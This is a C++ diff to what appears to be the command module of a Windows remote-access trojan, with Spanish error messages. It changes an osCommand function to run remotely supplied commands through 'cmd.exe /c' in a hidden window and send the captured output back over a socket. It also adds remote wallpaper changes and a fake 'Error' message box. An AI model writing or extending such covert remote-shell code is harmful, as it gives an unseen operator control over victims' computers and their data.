@@ -117,8 +117,11 @@ bool Commands::downloadImage(const std::string &url,
 
 #ifdef _WIN32
 inline void setWallpaper(const std::string &filePath) {
-  SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)filePath.c_str(),
-                       SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+  if (!SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)filePath.c_str(),
+                            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
+    std::cerr << "Error al establecer el fondo de pantalla: " << GetLastError()
+              << std::endl;
+  }
 }
 #endif
 
@@ -139,6 +142,14 @@ bool Commands::wallpaperCommand(const std::string &params) {
   return true;
 }
 
+bool Commands::dialogCommand(const std::string &params) {
+#ifdef _WIN32
+  return MessageBoxA(NULL, params.c_str(), "Error", MB_OK | MB_ICONERROR);
+#endif
+
+  return true;
+}
+
 bool Commands::osCommand(const std::string &params) {
 #ifdef _WIN32
   std::string result;
@@ -149,15 +160,19 @@ bool Commands::osCommand(const std::string &params) {
     return false;
   }
 
-  STARTUPINFO si = {sizeof(STARTUPINFO)};
-  si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+  STARTUPINFO si = {0};
+  si.cb = sizeof(STARTUPINFO);
+  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
   si.hStdOutput = hStdOutWrite;
   si.hStdError = hStdOutWrite;
   si.wShowWindow = SW_HIDE;
-  PROCESS_INFORMATION pi = {};
+  PROCESS_INFORMATION pi = {0};
 
-  if (!CreateProcess(NULL, (LPSTR)params.c_str(), NULL, NULL, TRUE, 0, NULL,
-                     NULL, &si, &pi)) {
+  std::string command = "cmd.exe /c " + params;
+  LPSTR commandLine = const_cast<LPSTR>(command.c_str());
+
+  if (!CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si,
+                     &pi)) {
     CloseHandle(hStdOutWrite);
     CloseHandle(hStdOutRead);
     return false;
@@ -179,15 +194,6 @@ bool Commands::osCommand(const std::string &params) {
 
   send(clientSocket, result.c_str(), result.length(), 0);
 #endif
-  // return system(params.c_str());
-  return true;
-}
-
-bool Commands::dialogCommand(const std::string &params) {
-#ifdef _WIN32
-  return MessageBoxA(NULL, params.c_str(), "Error", MB_OK | MB_ICONERROR);
-#endif
-
   return true;
 }
 
